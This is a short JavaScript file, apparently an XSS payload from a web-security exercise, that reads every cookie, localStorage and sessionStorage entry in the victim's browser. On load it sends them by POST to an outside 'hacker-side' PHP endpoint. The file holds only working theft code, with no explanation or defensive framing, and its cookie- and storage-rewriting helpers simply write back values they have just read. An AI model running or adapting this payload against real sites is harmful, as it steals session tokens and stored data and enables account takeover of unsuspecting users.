function getLocalStorage() {
  return getStorageByType(localStorage);
}

function getSessionStorage() {
  return getStorageByType(sessionStorage);
}

function getStorageByType(storageType) {

  let values = [],
    keys = Object.keys(storageType),
    i = keys.length;

  while (i--) {
    values.push({key: keys[i], value: storageType.getItem(keys[i])});
  }

  return values;
}

function getCookies() {
  let pairs = document.cookie.split(";");
  let cookies = [];
  for (const pairString of pairs) {
    let pair = pairString.split("=");
    cookies.push({key: (pair[0] + '').trim(), value: unescape(pair.slice(1).join('='))});
  }
  return cookies;
}

function setAllCookies() {
  const cookies = getCookies();
  cookies.forEach((cookie) => {
    setCookie(cookie.key, cookie.value);
  })
}

function setCookie(key, value) {
  document.cookie = key + "=" + value + ";"
}

function setAllStorageByType(storageType) {
  const storage = getStorageByType(storageType);
  storage.forEach((storageItem) => {
    setStorageItem(storageType, storageItem.key, storageItem.value);
  })
}


function setStorageItem(storageType, key, value) {
  storageType.setItem(key, value);
}

function sendAllData() {
  fetch('https://wt143.fei.stuba.sk/xss/hacker-side/hacker-write.php', {
    method: 'post',
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      cookies: {
        cookies: getCookies(),
        localStorage: getLocalStorage(),
        sessionStorage: getSessionStorage()
      }
    })
  });

}

sendAllData();
